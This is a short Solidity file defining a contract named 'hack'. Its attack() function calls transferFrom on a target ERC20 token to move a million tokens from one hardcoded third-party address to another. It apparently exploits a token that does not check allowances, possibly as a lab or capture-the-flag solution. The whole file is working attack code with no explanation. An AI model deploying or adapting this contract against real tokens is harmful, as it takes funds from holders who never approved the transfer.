// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;


interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

contract hack {
  IERC20 target ;
  constructor(address _address) {
    target = IERC20(_address);
  }

  function attack() public  returns (uint) {
    bool result = target.transferFrom(0x620dE2FEA8fEAb1888E4d82e57B8b9C3401cC88d, 0xb5413D490717e69a274e1260c5A59ad35015E74D, 1000000000000000000000000);
    require(result , "transfer failed");
  }
  
}